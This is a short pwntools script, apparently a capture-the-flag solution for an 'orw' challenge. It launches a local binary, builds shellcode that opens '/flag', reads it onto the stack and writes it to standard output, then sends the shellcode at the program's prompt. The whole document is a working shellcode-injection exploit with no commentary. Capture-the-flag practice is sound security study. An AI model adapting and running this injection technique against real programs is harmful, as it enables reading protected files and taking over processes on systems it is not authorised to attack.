from pwn import *
binary = './orw.bin'
context.binary = binary
p = process(binary)

shellcode = shellcraft.open('/flag',0) + shellcraft.read('eax','esp',100) + shellcraft.write(1,'esp',100)
p.sendlineafter(':',asm(shellcode))

p.interactive()